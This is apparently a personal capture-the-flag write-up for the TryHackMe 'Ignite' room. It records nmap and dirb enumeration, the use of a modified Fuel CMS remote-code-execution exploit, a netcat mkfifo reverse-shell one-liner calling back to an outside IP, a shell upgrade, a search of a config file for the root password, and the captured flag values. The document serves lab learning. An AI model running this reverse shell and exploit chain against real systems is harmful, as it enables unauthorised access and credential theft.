# Nmap

nmap -sC -sV -oA scan $IP
![[Pasted image 20220120041007.png]]
Found Apache server on Port 80

# Website
Found some key info regarding admin page
![[Pasted image 20220120041207.png]]
![[Pasted image 20220120044622.png]]

# Dirb
dirb http://$IP -N 403,404,400 | grep 200
![[Pasted image 20220120042237.png]]


# Searchsploit 
![[Pasted image 20220120041358.png]]
Found RCE for fuel cms on exploit db
Did some changes and it worked perfectly
![[Pasted image 20220120041940.png]]

# After Exploit.py
Got reverse shell but not root yet 
Netcat payload for revshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.5.63 4444 >/tmp/f

![[Pasted image 20220120043727.png]]
I used python payload to get an interactive shell
python -c "import pty; pty.spawn('/bin/bash')"
and we got the flag.txt
6470e394cbf6dab6a91682cc8585059b
![[Pasted image 20220120044151.png]]

# PrivEsc
Now time to get to root
On the site we found out that the username and password is in database.php as shown

[[Pasted image 20220120044622.png]]
Lets find that 
find / -name 'database.php' 2>/dev/null
/var/www/html/fuel/application/config/database.php
I found the password for root and captured the flag
b9bbcb33e11b80be759c4e844862482d
![[Pasted image 20220120045157.png]]


# References 
There are many ways to solve this room like
- https://floreaiulianpfa.com/igniter-try-hack-me/
- https://tryhackme.com/resources/blog/ignite-writeup
- https://exploits.run/ignite/

# Room Link
- https://tryhackme.com/room/ignite
